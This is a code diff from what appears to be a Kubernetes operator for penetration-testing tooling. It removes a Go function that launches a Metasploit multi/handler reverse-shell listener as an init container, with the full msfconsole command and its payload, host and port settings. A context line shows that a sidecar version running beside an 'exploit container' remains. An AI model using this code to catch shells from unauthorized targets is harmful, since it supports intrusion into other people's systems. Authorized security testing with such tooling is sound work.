@@ -645,50 +645,6 @@ func buildS3FileDownloaderInitContainer(files []string) corev1.Container {
 	}
 }
 
-// buildReverseShellHandlerInitContainer creates an init container that spawns a reverse shell handler
-func buildReverseShellHandlerInitContainer(ctx context.Context, spec *ResourceSpec, configurator *ToolsConfigurator, namespace, resourceName string) corev1.Container {
-	log := log.FromContext(ctx)
-
-	// Build the reverse shell handler command using metasploit
-	handlerArgs := []string{
-		fmt.Sprintf("PAYLOAD=%s", spec.ReverseShell.Payload),
-		fmt.Sprintf("LHOST=%s", spec.ReverseShell.Host),
-		fmt.Sprintf("LPORT=%s", spec.ReverseShell.Port),
-	}
-
-	handlerCmd, err := configurator.BuildCommandWithModule("metasploit", "", spec.ReverseShell.Port, "exploit/multi/handler", spec.ReverseShell.Payload, handlerArgs)
-	if err != nil {
-		log.Error(err, "Failed to build reverse shell handler command")
-		handlerCmd = []string{
-			"/usr/src/metasploit-framework/msfconsole",
-			"-q",
-			"-x",
-			fmt.Sprintf("use exploit/multi/handler ; set PAYLOAD %s; set LHOST %s; set LPORT %s; exploit; exit -y", spec.ReverseShell.Payload, spec.ReverseShell.Host, spec.ReverseShell.Port),
-		}
-	}
-
-	return corev1.Container{
-		Name:    "reverse-shell-handler",
-		Image:   "metasploitframework/metasploit-framework:latest",
-		Command: []string{"sh", "-c"},
-		Args:    []string{strings.Join(handlerCmd, " ")},
-		Env: []corev1.EnvVar{
-			{
-				Name:  "LHOST",
-				Value: spec.ReverseShell.Host,
-			},
-			{
-				Name:  "LPORT",
-				Value: spec.ReverseShell.Port,
-			},
-			{
-				Name:  "PAYLOAD",
-				Value: spec.ReverseShell.Payload,
-			},
-		},
-	}
-}
-
 // buildReverseShellHandlerSidecar creates a sidecar container that spawns a reverse shell handler
 // This sidecar runs in parallel with the main exploit container, ensuring the handler is ready
 func buildReverseShellHandlerSidecar(ctx context.Context, spec *ResourceSpec, configurator *ToolsConfigurator, namespace, resourceName string) corev1.Container {
